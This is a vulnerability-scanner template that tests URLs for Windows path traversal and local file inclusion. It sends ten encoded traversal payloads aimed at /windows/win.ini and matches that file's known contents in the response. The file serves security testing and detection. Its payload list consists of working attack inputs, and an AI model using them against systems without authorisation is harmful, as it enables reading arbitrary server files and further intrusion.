id: generic-windows-lfi

info:
  name: Generic Windows based LFI Test
  author: mesaglio,sushantkamble
  severity: high
  description: |-
    Searches for /windows/win.ini on passed URLs
  tags: windows,lfi
  created: 2023/11/14

rules:
  r0:
    brute:
      mode: sniper
      commit: winner
      continue: false
      p:
        - /..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cwindows/win.ini
        - /./../../../../../../../../../../windows/win.ini
        - /.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/windows/win.ini
        - /.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./windows/win.ini
        - /%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2e%2ewindows/win.ini
        - /%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows/win.ini
        - /%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini
        - /?redirect=..%2f..%2f..%2f..%2fwindows/win.ini
        - /?page=..%2f..%2f..%2f..%2f..%2fwindows/win.ini
        - /?url=..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
    request:
      method: GET
      path: "{{p}}"
    expression: response.status == 200 && response.body.bcontains(b'bit app support') && response.body.bcontains(b'fonts') && response.body.bcontains(b'extensions')
expression: r0()
